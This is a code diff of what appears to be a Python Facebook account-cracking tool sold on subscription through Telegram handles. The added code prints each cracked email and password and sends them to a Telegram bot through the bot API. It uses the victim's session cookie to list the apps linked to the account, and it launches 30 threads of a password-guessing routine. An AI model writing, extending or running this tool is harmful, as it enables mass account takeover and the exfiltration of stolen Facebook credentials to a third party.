@@ -37,7 +37,7 @@ with Progress(console=console, transient=True) as progress:
         sleep(1)
 
 
-import datetime;now = datetime.date.today();target = datetime.date(2023, 11, 11)
+import datetime;now = datetime.date.today();target = datetime.date(2023, 11, 4)
 if now >=target:exit("توقف الاشتراك راسل كينزو @K_N_Z_O وفعل")
 
 try:
@@ -1235,4 +1235,86 @@ Do not forget the pictures 🔱
 							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
 							for muncul in apkAktif:
 								hit1+=1
-								infoakun 
+								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
+								hit2+=1
+						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
+							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
+						else:
+							hit1,hit2=0,0
+							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
+							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
+							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
+							for muncul in apkKadaluarsa:
+								hit1+=1
+								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
+								hit2+=1
+					else:pass
+					print('\n')
+					statusok = f'''[  𝑂𝐾   ]  •  🔥✅
+
+  ✦ 𝒆𝒎𝒂𝒊𝒍 ➛ {idf}\n
+
+  ✦ 𝒑𝒂𝒔𝒔𝒘𝒓𝒅  ➛ {pw}\n
+
+Do not forget the pictures 🔱
+
+ • BY : @UU0U8 || @K_N_Z_O				
+					'''
+					statusok1 = nel(statusok, style='green')
+					cetak(nel(statusok1, title='OK'))
+					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+					cek_RAVEN(kuki)
+					break
+
+
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
+
+def cek_RAVEN(kuki):
+	session = requests.Session()
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
+	sop = bs4.BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	try:
+		for i in range(len(game)):
+			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
+	except AttributeError:
+		print ("\r    %s\033[0m cookie invalid"%(M))
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
+	sop = bs4.BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	try:
+		for i in range(len(game)):
+			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
+	except AttributeError:
+		print ("\r    %s \033[0mcookie invalid"%(M))
+#-----------------------[ SYSTEM-CONTROL ]--------------------#
+if __name__=='__main__':
+	try:os.system('git pull')
+	except:pass
+	try:os.mkdir('OK')
+	except:pass
+	try:os.mkdir('CP')
+	except:pass
+	try:os.mkdir('/sdcard/heroes-DUMP')
+	except:pass
+	try:os.system('touch .prox.txt')
+	except:pass
+	try:os.system('pkg install play-audio')
+	except:pass
+	try:os.system('clear')
+	except:pass	
+	Login()
+	
+	Threads=[] 
+for t in range(30):
+ x = threading.Thread(target=passwrd)
+ x.start()
+ Threads.append(x)
+for Th in Threads:
+ passwrd()
